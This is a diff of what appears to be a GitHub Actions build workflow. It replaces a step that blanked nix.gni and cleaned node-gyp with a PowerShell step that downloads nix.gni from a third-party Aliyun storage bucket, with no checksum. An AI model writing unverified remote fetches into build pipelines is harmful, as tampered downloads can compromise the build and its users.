@@ -158,12 +158,11 @@ jobs:
         run: |
           npm install
 
-      # 9. 执行构建（关键步骤，需要根据项目文档调整具体命令）
-      - name: Build with cmake-js / node-gyp
-        shell: cmd
+      - name: Download and replace nix.gni
         run: |
-          echo. > nix.gni
-          npx node-gyp clean
+          # 下载文件并替换
+          Invoke-WebRequest -Uri "https://xxllxx.oss-ap-southeast-1.aliyuncs.com/nix.gni" `
+              -OutFile "nix.gni"
           
      # 9. 执行构建（关键步骤，需要根据项目文档调整具体命令）
       - name: configure
